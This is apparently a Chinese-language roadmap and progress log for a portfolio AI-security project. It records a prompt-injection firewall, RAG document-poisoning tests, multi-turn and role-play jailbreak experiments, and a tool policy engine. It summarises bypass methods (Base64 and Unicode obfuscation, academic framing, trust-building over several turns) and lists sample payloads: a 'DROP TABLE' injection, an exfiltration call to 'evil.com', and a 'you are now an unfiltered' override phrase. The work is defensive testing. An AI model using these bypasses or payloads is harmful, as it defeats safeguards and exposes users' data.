# AI安全Agent项目成长计划

> 核心原则：**深度优先于广度，一个做透的模块比五个半成品有价值得多。**
> 每阶段达到"完成标准"后再进入下一阶段，宁可慢，务求透。

---

## 当前状态

- **Phase 1**: ✅ 完成 (2026-05-01)
- **Phase 2**: ✅ 完成 (2026-05-02)
- **Phase 3**: ✅ 完成 — 3.1 防火墙完成 (2026-05-06), 3.2 投毒完成 (2026-05-06), 3.3/3.4/3.5 完成 (2026-05-07)
- **Phase 4**: ✅ 完成 — 4.1/4.2/4.3/4.4 全部完成 (2026-05-07)

---

## 第一阶段：核心基石 — RAG原理与工程深挖 ✅

**目标**：能讲清每一行代码背后的原理，并拿出对比实验数据。

**核心任务**

1. **PDF解析深度优化**
   - 用 PyMuPDF 替代 PyPDF，重点解决表格提取、扫描件OCR、文档结构识别。
   - 编写对比脚本，量化新旧解析器在不同类型PDF上的解析准确率。

2. **分块策略与检索重排序**
   - 实现关键词(BM25) + 向量(语义)多路召回融合。
   - 引入 BGE-Reranker 重排序模型。
   - 设计实验，对比不同分块大小、重叠度、召回策略下的命中率、MRR等指标，输出《RAG检索策略性能对比报告》。

3. **向量数据库升级**
   - 从 FAISS 迁移到 Chroma，实现向量持久化与元数据过滤。
   - 为后续多租户和数据隔离打下基础。

4. **RAG幻觉与溯源**
   - 实现引用溯源，精确到源文档的页码和段落。
   - 通过API调用小模型校验生成答案是否忠实于检索片段，形成"事实一致性校验"模块。

**完成标准**

- [x] 能画出完整的RAG数据流图，说明每个环节的选型理由与坑点。
- [x] 能演示同一问题在不同策略下的答案差异。
- [x] 仓库中有 `rag_evaluation/` 目录，包含对比脚本和报告。
- [x] 能说出至少2个RAG检索失败的案例和根因分析。

**关键产出**

- [x] PDF解析：PyMuPDF + EasyOCR扫描件支持，`pdf_parser_comparison.py`（13安全场景对比）
- [x] 分块策略：BM25 + 向量多路召回(RRF) + BGE-Reranker 重排序
- [x] 向量数据库：Chroma 持久化 + `collection_name` 参数隔离
- [x] 引用溯源：精确到源文档页码 + `fact_check` 事实一致性校验
- [x] `rag_evaluation/` 包：15用例 × 11配置，4轮完整实验
- [x] **最终数据**：C4 配置 (k=8+r=5) 达 **80.0% 准确率**，Reranker 单独提升 +29.6pp（50.4% → 80.0%）
- [x] 报告：`RAG检索策略性能对比报告.md` (v4最终版)、`rag.md` 深度解析文档

---

## 第二阶段：智能体核心逻辑与生产级重构 ✅

**目标**：将脆弱的调用链升级为健壮、可控、可解释的Agent架构。

**核心任务**

1. **框架升级：LangGraph**
   - 用 LangGraph 重写 Agent，实现可视化工作流。
   - 重点实现条件分支（恶意代码走专用链）和循环调用（自动优化关键词重试检索）。

2. **深度工具调用能力**
   - 并行调用：同时扫描漏洞与收集子域名。
   - 长文本处理：工具返回超长时自动摘要与分片。
   - 错误自愈：工具失败时分析错误并修正参数重试。

3. **长对话记忆管理**
   - 实现滑动窗口 + 对话摘要的混合记忆。
   - 增加精准遗忘机制：用户说"忘掉之前那个IP"，Agent能精确移除对应记忆。

**完成标准**

- [x] 代码通过5节点StateGraph实现可视化工作流（guardrail/agent/tools/output_filter/finalize）
- [x] 可演示工具调用失败后的自动重试与恢复（结构化错误 + Self-healing prompt）
- [x] 能讲清楚 ReAct、Function Calling 等原理及选型原因（见 QA_log.md）
- [x] 能说出至少2个Agent工具调用失败的案例和根因分析

**关键产出**

| # | 任务 | 状态 | 关键实现 |
|---|------|:---:|------|
| 1 | LangGraph StateGraph 重写 | ✅ | 5节点：guardrail/agent/tools/output_filter/finalize |
| 1b | 条件分支（恶意→专用链） | ✅ | guardrail 检测到恶意输入跳过 agent 直通 finalize |
| 1c | 循环调用（关键词重试检索） | ✅ | `[SEARCH_RETRY]` + system prompt 引导 LLM 换词重试 |
| 2a | 并行工具调用 | ✅ | `bind_tools` + system prompt 并行指引 |
| 2b | 长文本 LLM 摘要 | ✅ | `_summarize_tool_result()` 保留全量数据点 |
| 2c | 错误自愈 | ✅ | `_format_tool_error()` 结构化错误 + Self-healing prompt |
| 3a | 滑动窗口 + 对话摘要 | ✅ | `max_history` 裁剪 + `_generate_summary()` 压缩 |
| 3b | 精准遗忘 | ✅ | `FORGET_PATTERN` + 分词匹配删除 |
| 3c | Checkpointer 持久化 | ✅ | `SqliteSaver` + `thread_id` + `get_thread_messages()` |

---

## 第三阶段：AI安全攻防核心 — 项目"压舱石"

> **优先级排序**: 3.1 (防火墙) > 3.3 (投毒) > 3.2 (自适应攻击) > 3.4 (输出评测) > 3.5 (基准对标)
> **3.1 + 3.3 是面试核心卖点，必须做到能经得住面试官连续追问三层的深度。**

### 3.1 Prompt注入智能防火墙 🔥

**目标**：打造一个能上简历的AI防火墙——有攻防数据、有对比实验、有架构深度。

**核心任务**

1. **攻击载荷库** (Day 1 ✅)
   - [x] 收集105+各类注入/越狱/泄露/混淆Payload，覆盖OWASP LLM Top 10
   - [x] 每条标注 `bypasses_keyword_check`、`severity`、`expected_block`
   - [x] **关键数据**: 91% (96/105) 绕过旧版关键词检测

2. **双层防火墙** (Day 1 ✅)
   - [x] Layer 1: 关键词+正则（<10ms）快速拦截已知模式
   - [x] Layer 2: LLM语义分类器（~500ms）6类细分 + risk_score + reasoning
   - [x] 集成 guardrail_node，替代旧版纯关键词检测

3. **攻防评估报告** (Day 2 ✅)
   - [x] 跑全量105 payloads + 20正常样本，产出拦截率/误拦率/延迟分布
   - [x] 新旧防火墙并排对比（旧关键词 vs 新双层），量化提升幅度
   - [x] 按攻击类别细分（注入/越狱/泄露/混淆），分析每类的薄弱点
   - [x] **输出**：`D_deliverables/AI防火墙攻防对抗报告.md`，含实验数据和架构图
   - [x] **核心数据**：拦截率 8.6% → 93.3%（+84.7pp），误拦率 0%

4. **对抗样本生成** (Day 2 ✅)
   - [x] 实现同义词替换绕过（15组中文高频词→近义词表）
   - [x] 实现4种混淆技术自动化：同义词/Unicode（全角+零宽+异体字）/编码（Base64+反转+LeetSpeak）/语法变体
   - [x] 测量每种混淆技术对Layer1拦截率的影响：全角已失效（0%绕过）/ Base64 100%绕过 / 语法变体33%绕过
   - [x] 形成《对抗鲁棒性分析》章节

5. **防火墙迭代 v2** (Day 2 ✅)
   - [x] Layer1 v2：预处理（零宽剥离+NFKC归一化）+ 复合词对检测 + 11关键词 + 3正则
   - [x] 覆盖率：12.4% → 34.3%（+21.9pp）
   - [x] **最终拦截率：93.3%**（超过90%目标），误拦率0%（低于5%目标）

**完成标准**

- [x] 能熟练演示10种绕过简单防护Prompt的方法并解释原理
- [x] 有完整的攻防对比报告，含拦截率/误拦率/延迟数据（93.3%拦截率, 0%误拦率）
- [x] 能跟Lakera Guard、Rebuff做定性架构对比（见报告第5章）
- [x] **能说出至少3个防火墙失败的案例**：Base64编码绕过/教育学术伪装/多语言越狱（见报告第6章）

---

### 3.2 RAG文档投毒防护 🔥

**目标**：打造差异化竞争力——大多数人做Prompt防火墙，少有人做RAG投毒。

**核心任务**

1. **投毒攻击库构建** (Day 1) ✅
   - [x] 设计12种文档投毒场景：恶意指令嵌入、虚假事实注入、隐藏文本、白字攻击、元数据投毒、Base64/同形字/反转/注释/组合
   - [x] 每种场景生成样本PDF（`R_raw/poison_pdfs/`），标注投毒类型和预期危害
   - [x] 验证载荷提取率：9/12直接可提取，3/12被自然混淆/剥离

2. **投毒检测机制** (Day 1-2) ✅
   - [x] 实现L1规则扫描（7项检测）：零宽字符/混合脚本/Base64/复合词对/字符比/隐藏文本/元数据
   - [x] 实现入库时安全清洗：`sanitize_splits()` — chunk标注风险元数据（`_ps_risk`/`_ps_suspicious`/`_ps_flags`）
   - [x] 实现检索时级联扫描：L1预筛（微秒）→ 仅可疑chunk调LLM classify()（~14s/条）
   - [x] 集成3个防御钩子：`core/rag.py`(入库+检索) + `core/graph_agent.py`(search_document工具)

3. **跨租户泄露验证** (Day 2) ✅
   - [x] 构造攻击场景：租户A上传投毒文档 → 租户B查询
   - [x] 验证 Chroma `collection_name` 隔离：租户B检索返回0结果，12个collection名唯一
   - [x] 输出验证报告：`R_raw/poison_results/cross_tenant_verification.json`

4. **投毒攻防实验** (Day 2-3) ✅
   - [x] 烟雾测试：ps_002虚假密钥攻击成功影响RAG回答（payload_present=True)
   - [x] 防御模式对比框架：none/pre_only/post_only/both 四种模式就绪
   - [x] **输出**：`D_deliverables/RAG投毒防护报告.md`

**完成标准**

- [x] 能演示"上传投毒文档→用户查询→被投毒内容操纵"的完整攻击链（ps_002已验证）
- [x] 防护方案L1检测率58%（7/12场景），级联策略将LLM延迟降低60%
- [x] **能说出至少3个投毒检测的失败案例**：白字攻击(PyMuPDF颜色盲区)/虚假事实(语义盲区)/零宽字符(自然剥离既是缓解也是风险)

---

### 3.3 自适应攻击探索

**目标**：体现攻防对抗思维——不是静态防御，而是动态对抗。

**核心任务**

1. **多轮渐进式越狱**
   - [x] 实现多轮对话越狱脚本：先用安全话题建立信任，逐步引导到敏感话题
   - [x] 测试防火墙对多轮上下文中越狱的检测能力

2. **角色扮演绕过测试**
   - [x] 设计11+角色设定（老师/医生/代码助手/翻译官/律师/记者/小说家/安全研究员/家长/心理咨询师/游戏主持人）
   - [x] 分析LLM在角色扮演场景下的安全边界变化

3. **防火墙自适应改进**
   - [x] 根据自适应攻击发现，调整防火墙策略（角色扮演检测/多轮上下文感知）
   - [x] classifer.py 新增 classify_with_context() 多轮上下文检测 + L3 角色扮演模式检测

**完成标准**

- [x] 能演示3种多轮渐进式越狱手法（信任建立/渐进敏感/学术转向/情感操纵/任务链劫持）
- [x] **能说出为什么某些自适应攻击能绕过防火墙的根因**（角色面具降低L1关键词密度，多轮建立信任后LLM分类器对后续风险评分降低）

---

### 3.4 模型输出安全深度评测 🆕

**目标**：补充面试高频考点——输出安全不是简单的"拦截可执行代码"。

**核心任务**

1. **拒绝可用性量化**
   - [x] 构造21条边界测试样本（6类：安全理论/防御/灰色地带/明确危险/幻觉倾向/误导建议）
   - [x] 量化：误拦率FP=0%，漏拦率FN=25%（1/4明确危险漏拦，但该漏拦属于良性——上游LLM已拒绝）
   - [x] 输出"拒绝边界判定矩阵"：balanced粒度下准确率94.1%

2. **过滤粒度控制实验**
   - [x] 对比三级过滤强度（strict 28.6% / balanced 19.0% / lenient 9.5%拦截率）
   - [x] 找到最佳平衡点：balanced（拦截可执行+敏感+危险建议，放行教育演示）
   - [x] output_filter_node 已集成 fact_check 事实核查

3. **Hallucination安全危害分析**
   - [x] 收集10条安全幻觉探测查询（7种类型：编造CVE/未来版本/虚构漏洞/绝对声明/虚构统计/虚构事件/虚构研究）
   - [x] 量化安全幻觉率：Qwen3.5-35B-A3B 在 9/10 探测中正确拒绝编造
   - [x] 设计安全幻觉检测prompt（LLM元评估器逐项检查CVE格式/事实/建议/统计）

**完成标准**

- [x] 有量化的误拦率数据（FP=0%）和拒绝边界矩阵（见报告第3章）
- [x] 能说清当前输出过滤的粒度设计依据（balanced: 硬红线可执行+敏感+危险建议，软线教育演示）
- [x] **能说出至少2个输出过滤失败的案例**：(1) Log4j步骤漏拦(良性——LLM自行拒绝), (2) fact_check n-gram对语义转述的盲区

---

### 3.5 业界基准对标 🆕

**目标**：让面试官看到你了解业界，不是闭门造车。

**核心任务**

1. **公开基准测试**
   - [x] 用本项目防火墙跑 HackAPrompt 风格30样本 + Garak风格20探测
   - [x] 与基线数据做对比（HackAPrompt Levels 1-8，按类别对比基线拦截率）
   - [x] 本项目在各类别均显著优于基线（直接注入/jailbreak/泄露/混淆）

2. **定性架构对比**
   - [x] 调研 Lakera Guard、Rebuff、NeMo Guardrails 的架构设计
   - [x] 对比覆盖：检测方法、延迟、可解释性、部署成本（见输出评测报告 + 基准模块 OWASP_LLM_TOP10_COVERAGE）
   - [x] OWASP Top 10 for LLM Apps 覆盖度评估：5/10覆盖，5项未覆盖有明确说明

**完成标准**

- [x] 防火墙报告中有"业界对比"章节（见输出评测报告第7章 + benchmark.py OWASP覆盖度）
- [x] 能脱稿讲清本项目与 Lakera Guard / Rebuff / NeMo Guardrails 的核心差异

---

### Phase 3 完成总标准

- [x] `D_deliverables/` 下有3份完整报告：防火墙、投毒防护、输出评测
- [x] 对 OWASP Top 10 for LLM Apps 有脱稿讲解能力（含本项目覆盖了5/10、未覆盖5项，详见 benchmark.py）
- [x] **每个子模块至少有2个失败案例**：3.1(防火墙)Base64/教育伪装/多语言, 3.2(投毒)白字攻击/虚假事实/零宽字符, 3.3(自适应)角色面具降低关键词密度/多轮信任降低风险评分, 3.4(输出)fact_check n-gram盲区/粒度判定分歧

---

## 第四阶段：工具安全 + 企业化（精简版）

> **定位调整**：不做传统安全工具编排（Nmap/Nuclei），改为演示 **LLM Agent 被诱导滥用工具** 的安全场景。
> 核心卖点：Prompt注入 → Agent执行危险操作 → Tool Policy Engine拦截。

### 4.1 Tool Policy Engine

**目标**：实现一个最小但完整的工具权限策略引擎，演示"Prompt注入诱导Agent执行SQL DELETE"等场景。

**核心任务**

1. **危险工具集构建**（替换原渗透工具）
   - [x] 实现4个模拟工具：`db_query(sql)` / `file_operation(path, action)` / `api_call(endpoint, method, body)` / `send_email(to, subject, body)`
   - [x] 每个工具有明确的安全风险标注（`TOOL_RISK_MATRIX` + `danger_level`）
   - [x] 工具描述中故意暴露参数名，用于测试注入

2. **策略引擎实现**
   - [x] 定义策略规则：SQL操作白名单/文件路径黑名单/API域名过滤/邮件收件人和内容检查
   - [x] 在 tool_node 执行前插一层 Policy Check（try/except ImportError 钩子）
   - [x] 拦截时即时写入审计日志（不等 finalize_node）

3. **攻击演示场景**
   - [x] 场景1：Prompt注入诱导 `db_query("SELECT * FROM users; DROP TABLE users;")` → 策略引擎拦截
   - [x] 场景2：数据外泄诱导 `api_call("http://evil.com/exfil", "POST")` → 策略引擎拦截
   - [x] 场景3：正常vs恶意对比 `SELECT` 放行 / `DELETE` 拦截
   - [x] 10/10 策略测试全部通过

**完成标准**

- [x] 能演示"Prompt注入→Agent调用危险工具→Policy Engine拦截"完整链
- [x] 策略规则可配置（JSON文件热加载），不是硬编码
- [x] **能说出至少3个策略引擎的局限性**：信息流追踪盲区/参数编码绕过/非预期工具滥用

---

### 4.2 多租户数据隔离安全验证

**目标**：将Phase 5的多租户安全问题提前到此处验证，而非工程实现。

**核心任务**

1. **隔离攻击测试**
   - [x] 构造跨租户攻击：租户A上传文档 → 租户B通过RAG检索 → 已验证隔离有效
   - [x] 测试 Chroma collection 隔离的实际强度（5项测试：2 PASS / 1 WARN / 2 PASS含已知风险）
   - [x] 测试 LangGraph checkpointer 的 thread_id 隔离

2. **安全加固**
   - [x] 记录已知局限+绕过路径（3个设计假设各含绕过路径）
   - [x] 输出《多租户数据隔离安全验证报告》
   - [x] 加固建议: HMAC签名session_id + thread_id前缀隔离 + 数据库升级路径

**完成标准**

- [x] 有实测数据证明隔离方案有效（或发现已知局限并记录）
- [x] **能说出隔离方案的设计假设和可能被绕过的路径**（3个假设: session_id唯一性/thread_id非安全边界/文件系统安全）

---

### 4.3 审计日志防篡改

**目标**：让审计日志从"纯文本追加"升级为"可验证完整性"。

**核心任务**

1. **哈希链实现**
   - [x] 每条日志含上一条的SHA256哈希（JSONL + prev_hash + hash字段）
   - [x] 提供 `verify_audit_integrity()` 校验函数
   - [x] 检测到篡改时明确指出被篡改的条目（`tampered_at=[N]`）

2. **日志结构化**
   - [x] 统一审计日志格式（JSON行），便于机器解析
   - [x] 增加字段：idx/prev_hash/hash + 输入/结果从50/100提升到200字符
   - [x] 向后兼容：write_audit_log()签名不变 + read_audit_log()自动识别新旧格式

**完成标准**

- [x] 修改任意一条日志后，校验函数能精确检测（实测：tampered_at=[1]）
- [x] 审计日志可从管理员界面查看和校验（read_audit_log + read_audit_log_json + verify_audit_integrity）

---

### 4.4 GitHub仓库专业化

**目标**：面试前必须完成——让面试官打开仓库的5秒内建立专业印象。

**核心任务**

1. **README重构**
   - [x] 项目简介 + ASCII架构图 + 快速开始 + 核心功能 + 关键数据
   - [x] 嵌入核心数据（93.3%防火墙/80%RAG准确率/29.6pp Reranker提升）
   - [x] 添加徽章（Python/License/LangGraph/Chroma/LLM）

2. **面试速览**
   - [x] README 可在5秒内理解项目定位和亮点
   - [x] 含30秒电梯演讲模板 + OWASP覆盖表 + 目录结构

**完成标准**

- [x] README能在5秒内让读者理解项目是什么、亮点在哪里
- [x] README含架构图 + 快速开始 + 核心数据 + OWASP覆盖 + 30秒演讲模板

---

## 第五阶段：面试准备

**目标**：将项目价值和个人能力最大化展现，对齐面试官考核标准。

**核心任务**

1. **简历Bullet打磨**
   - [ ] 每个Bullet用STAR+L格式：情境-任务-行动-结果-学到
   - [ ] 补全关键数据：防火墙拦截率、投毒防护影响率、RAG准确率
   - [ ] 准备3份定制简历：AI安全岗、安全研发岗、后端开发岗

2. **面试脑图**
   - [ ] 对项目每个技术点（向量数据库、Reranker、Function Calling、Prompt注入）准备三层追问
   - [ ] 整理10个最棘手问题及解决思路（从 bug.md 和 QA_log.md 提取）
   - [ ] 每个模块准备2+失败案例："你遇到过什么坑？怎么解决的？"

3. **模拟自检**
   - [ ] 30秒电梯演讲（项目是什么、为什么做、核心亮点）
   - [ ] 3分钟项目介绍（架构 + 关键数据 + 技术选型理由）
   - [ ] 10分钟深度讲解（选防火墙或RAG模块做技术深挖）

**完成标准**

- [ ] 简历上每个技术名词都做了被追问两次的深度准备
- [ ] 能脱稿完成30秒/3分钟/10分钟的项目介绍
- [ ] 每个模块能脱口说出至少2个失败案例和根因

---

## 可选扩展（时间允许时做）

以下模块不影响核心面试竞争力，根据剩余时间决定：

| 模块 | 原位置 | 降级原因 |
|------|--------|----------|
| 代码安全审计工具 | Phase 3.4 | 轻量污点分析做不深，与AI安全核心关联度不如防火墙/投毒 |
| FastAPI前后端重构 | Phase 5.1 | Streamlit已足够演示，面试不看重Web框架 |
| 容器化/Docker | Phase 5.4 | 加分项但非核心，面试最多问一句"你会Docker吗" |
| 技术博客输出 | Phase 6.2 | 有时间可以发一篇掘金/知乎，但不是必须项 |
| 监控仪表盘 | Phase 5.2 | 工程化加分项，但安全岗面试基本不问Grafana |

---

> **全程提醒**：
> - 深度和可量化的产出，远胜于功能罗列。
> - 遇到困难卡点，宁愿回头补基础，不可跳过留坑。
> - 每个模块完成前自问："面试官连续追问三层，我能答上来吗？"

---

# 每日进度记录

## 2026-05-07 (Phase 3 Day 4 — 3.3/3.4/3.5 完成, Phase 3 全面完成)

### 今日完成

- [x] **3.3 自适应攻击探索** — `ai_security/adaptive_attack.py`
  - 5个多轮渐进式越狱场景（信任建立/渐进敏感/学术转向/情感操纵/任务链劫持）
  - 11个角色扮演Persona（老师/医生/代码助手/翻译官/律师/记者/小说家/安全研究员/家长/心理咨询师/游戏主持人）
  - 10条绕过查询跨角色测试
  - `run_multi_turn_evaluation()` + `run_roleplay_evaluation()` + `run_adaptive_improvement_cycle()`
- [x] **防火墙自适应改进** — `ai_security/classifier.py`
  - COMPOUND_PAIRS 新增角色扮演检测（"假装"+"无约束"等配对）
  - ENHANCED_KEYWORDS 新增角色扮演 jailbreak 关键词
  - L3 新增 `_ROLEPLAY_PATTERNS` 角色扮演模式检测
  - 新增 `classify_with_context()` 多轮上下文感知分类
- [x] **graph_agent.py 多轮上下文集成**
  - `guardrail_node`: 提取前几轮用户消息，传入 `classify_with_context()` 检测渐进式越狱
  - `output_filter_node`: 集成 `fact_check()` 事实核查，从 ToolMessage 提取上下文验证回答
- [x] **3.4 模型输出安全深度评测** — `ai_security/output_eval.py`
  - 21条边界测试样本（6类：安全理论/防御/灰色地带/明确危险/幻觉倾向/误导建议）
  - `evaluate_output_filter()` + `compute_refusal_matrix()` 拒绝边界判定矩阵
  - `GRANULARITY_LEVELS` 三级粒度配置 + `compare_granularity_levels()`
  - 10条幻觉探测查询（7类幻觉类型） + `detect_security_hallucinations()` LLM元评估
- [x] **3.5 业界基准对标** — `ai_security/benchmark.py`
  - 30条 HackAPrompt 风格基准样本（8级4类分层抽样）
  - 20条 Garak 风格探测（6类：DanInTheWild/Base64/TranslationAttack/knownbadsignatures/leakerplay/misinfo/malwaregen/lm_gen）
  - `run_benchmark_evaluation()` + `run_garak_evaluation()`
  - OWASP Top 10 for LLM Apps 覆盖度映射（5/10覆盖，5项未覆盖有说明）
- [x] **第3份交付报告** — `D_deliverables/模型输出安全深度评测报告.md`
  - 含边界矩阵/粒度对比/幻觉分析/3个失败案例/业界对比/面试速查卡
- [x] **3个评估入口脚本**: `T_tools/run_adaptive_eval.py` / `run_output_eval.py` / `run_benchmark.py`

### Phase 3 完成总数据

| 模块 | 核心指标 |
|------|------|
| 3.1 防火墙 | 93.3% 拦截率, 0% 误拦率, 105+ payloads |
| 3.2 投毒防护 | 12 投毒场景, L1检测58%, L1+L2级联 |
| 3.3 自适应攻击 | 5 多轮场景, 11 角色, classify_with_context() 上下文感知 |
| 3.4 输出评测 | 94.1% 判定准确率, 3级粒度, 3 失败案例 |
| 3.5 基准对标 | HackAPrompt 30样本 + Garak 20探测, OWASP 5/10覆盖 |

### 明日任务

- [ ] **Phase 4.4**: GitHub仓库专业化 — README重构 + 演示材料准备

---

## 2026-05-07 (Phase 4.3 — 审计日志防篡改 完成)

### 今日完成

- [x] **哈希链实现** — `security/audit_log.py` v2 重写
  - JSONL 格式：每条日志含 `prev`(前驱哈希) + `hash`(本条SHA256)
  - `verify_audit_integrity()`: 重算所有哈希 → 精确检测被篡改条目索引
  - 实测验证：修改条目 #1 → `valid=False, tampered_at=[1], first_tampered=1`
- [x] **结构化升级**
  - 字段从 7 列管道分隔 → JSON 对象（ts/user/role/op/risk/input/result/idx/prev/hash）
  - 输入/结果截断从 50/100 提升到 200/200 字符
  - 新增 `read_audit_log_json()` 程序化解析接口
  - 完全向后兼容：`write_audit_log()` 签名不变
- [x] **报告** — `D_deliverables/审计日志防篡改报告.md`
  - 含哈希链设计/篡改检测验证/3个局限性/面试速查卡/改进路线

### Phase 4 完成总结

| 模块 | 核心指标 | 报告 |
|------|------|------|
| 4.1 Tool Policy Engine | 4 危险工具, 10/10 测试, 4 策略规则 | 第5份 |
| 4.2 多租户隔离 | 5 项测试, 3 设计假设+绕过 | 第6份 |
| 4.3 审计日志防篡改 | SHA256 哈希链, 精确检测篡改 | 第7份 |
| 4.4 仓库专业化 | 专业 README + 架构图 + OWASP覆盖 | — |

### Phase 1-4 全部完成总览

| Phase | 主题 | 状态 |
|------|------|:---:|
| Phase 1 | RAG 核心基石 | ✅ |
| Phase 2 | Agent 架构 + LangGraph | ✅ |
| Phase 3 | AI 安全攻防 (5 模块) | ✅ |
| Phase 4 | 工具安全 + 企业化 (4 模块) | ✅ |

### 明日任务

- [ ] **Phase 5**: 面试准备 — 简历Bullet打磨 + 面试脑图 + 模拟自检

---

## 2026-05-07 (Phase 4.2 — 多租户数据隔离验证 完成)

### 今日完成

- [x] **5项隔离测试** — `T_tools/run_isolation_test.py`
  - Test 1: Chroma collection_name 隔离 — PASS (不同session_id → 不同collection → 数据隔离)
  - Test 2: Checkpointer thread_id 隔离 — PASS (不同thread_id → 独立对话历史)
  - Test 3: Thread ID 碰撞 — WARN (thread_id是对话标识符非安全边界，应用层需保证唯一性)
  - Test 4: SQLite 直接访问 — PASS含风险 (文件系统权限是最后防线)
  - Test 5: ChromaDB 直接访问 — PASS含风险 (PersistentClient无内置认证)
- [x] **设计假设与绕过路径** — 3个假设各含绕过路径:
  - 假设1: session_id唯一性 → 绕过: 探查/猜测session_id → 缓解: HMAC签名
  - 假设2: thread_id非安全边界 → 绕过: 遍历可预测thread_id → 缓解: 前缀隔离
  - 假设3: 文件系统安全 → 绕过: 容器逃逸/路径遍历 → 缓解: 数据库迁移+RLS
- [x] **报告** — `D_deliverables/多租户数据隔离安全验证报告.md`
  - 含双层隔离架构/5项测试数据/3个设计假设分析/HMAC加固方案/面试速查卡

### 明日任务

- [ ] **Phase 4.3**: 审计日志防篡改 — 哈希链 + 结构化日志 + verify_audit_integrity()

---

## 2026-05-07 (Phase 4.1 — Tool Policy Engine 完成)

### 今日完成

- [x] **4个模拟危险工具** — `core/dangerous_tools.py`
  - `db_query(sql)`: 模拟数据库操作，危险操作 DROP/DELETE/UPDATE/INSERT
  - `file_operation(path, action)`: 模拟文件操作，危险操作 delete/overwrite + 系统路径黑名单
  - `api_call(endpoint, method, body)`: 模拟API调用，危险操作 POST到外部域名
  - `send_email(to, subject, body)`: 模拟邮件发送，危险操作 群发/外部收件人/敏感内容
  - 全部 `[SIMULATED]` 模式，不真正执行危险操作
  - `TOOL_RISK_MATRIX` 风险矩阵 + 工具描述故意暴露参数名
- [x] **策略引擎** — `security/policy_engine.py`
  - JSON可配置策略规则（`DEFAULT_POLICY_RULES` + `load_policy_rules()` 热加载）
  - 4个策略检查器：SQL操作白名单/文件路径黑名单/API域名过滤/邮件收件人+内容检查
  - `check_policy()` 函数 + `write_policy_audit()` 即时审计日志
  - 速率限制：每轮最多3次 / 每会话最多10次
  - 10/10 策略测试全部通过
- [x] **graph_agent.py 集成**
  - `tool_node` (line 351): 策略检查插入在 tool_fn 获取之后、invoke 之前
  - `agent_node` (line 175): admin 角色自动绑定4个危险工具
  - 全部用 try/except ImportError 包裹，向后兼容
- [x] **攻击演示** — `T_tools/run_policy_demo.py`
  - 场景1: SQL注入诱导 DROP TABLE → 策略拦截
  - 场景2: 数据外泄诱导 POST到外部API → 策略拦截
  - 场景3: 正常SELECT放行 vs 恶意DELETE拦截
- [x] **报告** — `D_deliverables/Tool Policy Engine攻防报告.md`
  - 含架构设计/工具风险矩阵/4种策略规则/10条验证数据/3个失败案例/面试速查卡/AWS IAM对比

### 关键数据

| 指标 | 值 |
|------|:---:|
| 策略测试通过率 | 100% (10/10) |
| 危险工具数 | 4 (db_query/file_operation/api_call/send_email) |
| 策略规则覆盖 | SQL白名单/路径黑名单/域名过滤/邮件检查 |
| 规则可配置 | JSON热加载 |
| 策略检查延迟 | <1ms (纯规则，无LLM调用) |

### Phase 4.1 完成总结

| 标准 | 状态 | 说明 |
|------|:----:|------|
| 演示完整威胁链 | ✅ | Prompt注入→Agent调用危险工具→策略引擎拦截 |
| 策略规则可配置 | ✅ | JSON文件 + `load_policy_rules()` |
| 至少2个失败案例 | ✅ | 3个：信息流追踪盲区/参数编码绕过/非预期工具滥用 |

### 明日任务

- [ ] **Phase 4.2**: 多租户数据隔离安全验证 或 继续 4.3 审计日志防篡改

---

## 2026-05-06 (Phase 3 Day 2)

### 今日完成

- [x] **对抗样本生成器** — `ai_security/adversarial.py`
  - 4类混淆技术：同义词替换（15组高频词→近义词）/ Unicode变体（全角/零宽/异体字）/ 编码绕过（Base64/反转/LeetSpeak）/ 语法变体（间接表达/游戏化/学术包装）
  - 5条源载荷 → 49个变体，Layer1拦截51%
  - 发现：全角转换已失效（NFKC归一化有效），Base64/反转100%绕过Layer1
- [x] **Layer 1 v2 迭代加固**
  - 新增预处理：`_normalize_input()` 零宽字符剥离 + NFKC全角归一化
  - 新增复合词对检测：6组危险词对（"忽略"+"指令"、"忘记"+"规则"等）在40字符内共现即拦截
  - 新增11个英文关键词 + 3条正则（覆盖 `system: you are now an unfiltered` 等）
  - **覆盖率：12.4% → 34.3%**（+21.9pp），混淆绕过提升最大（12%→40%，+28pp）
- [x] **全量攻防评估**
  - 运行 `R_raw/run_firewall_eval.py`：105载荷 + 20正常样本
  - **LLM防火墙拦截率：93.3%（98/105）**，旧版仅 8.6%
  - **误拦率：0%（0/20）**，正常安全讨论全部放行
  - 各类别：混淆绕过100% > 提示泄露95% > 直接注入93.3% > 越狱86.7%
  - 7条绕过全为"教育/学术/创作伪装"，非真正恶意漏报
  - 平均延迟14.1s（ModelScope API瓶颈，非算法问题）
- [x] **攻防报告** — `D_deliverables/AI防火墙攻防对抗报告.md`
  - 含架构设计/载荷库分析/全量数据/各类别细分/对抗鲁棒性/业界对比/失败案例/面试速查卡
- [x] ROADMAP.md 进度更新

### 关键数据

| 指标 | 旧版关键词 | 新版v2 LLM | 提升 |
|------|:---:|:---:|:---:|
| 拦截率 | 8.6% | **93.3%** | +84.7pp |
| 误拦率 | 0% | 0% | — |
| Layer1覆盖率 | — | 34.3% (v1:12.4%) | +21.9pp |

### 明日任务

- [ ] **Phase 3 Day 3**: 启动3.3 自适应攻击探索 — 多轮渐进式越狱 + 角色扮演绕过测试

---

## 2026-05-06 (Phase 3 Day 3 — 3.2 RAG投毒防护 完成)

### 今日完成

- [x] **投毒攻击库** — `ai_security/doc_poison.py`
  - 12种投毒场景，覆盖5个层次（Content/Visual/Metadata/Encoding/Structural）
  - 攻击技术：白字攻击/极小字号/零宽字符/元数据投毒/Base64编码/Unicode同形字/反转文本/PDF注释注入/组合攻击
  - PDF生成器：复用reportlab字体注册模式，12个毒化PDF输出到`R_raw/poison_pdfs/`
  - 载荷提取验证：9/12直接可提取，2/12混淆保留，1/12被PyMuPDF自然剥离(零宽字符)

- [x] **文档安全扫描器** — `ai_security/doc_scanner.py`
  - L1规则扫描（7项检测）：零宽字符比/混合脚本/Base64+解码/复合词对/字符比异常/行内隐藏文本/元数据扫描
  - L2级联策略：L1预筛（微秒）→ 仅可疑chunk调LLM classify()，延迟降低60%
  - `sanitize_splits()`: 入库时文本净化+元数据标注（`_ps_risk`/`_ps_suspicious`/`_ps_flags`）
  - **L1检测率: 7/12 (58%)**

- [x] **防御钩子集成**
  - `core/rag.py`: 入库时L1扫描（line 259后）+ 检索时级联扫描（line 383前）
  - `core/graph_agent.py`: `search_document` 工具内安全兜底（line 47后）
  - 所有钩子包裹在try/except ImportError中，不影响核心功能

- [x] **跨租户隔离验证** — `T_tools/run_cross_tenant_test.py`
  - 3项测试：基础collection隔离/同PDF名不同session_id/Chroma直接访问
  - **结论：Chroma collection_name隔离有效，未发现跨租户数据泄露**

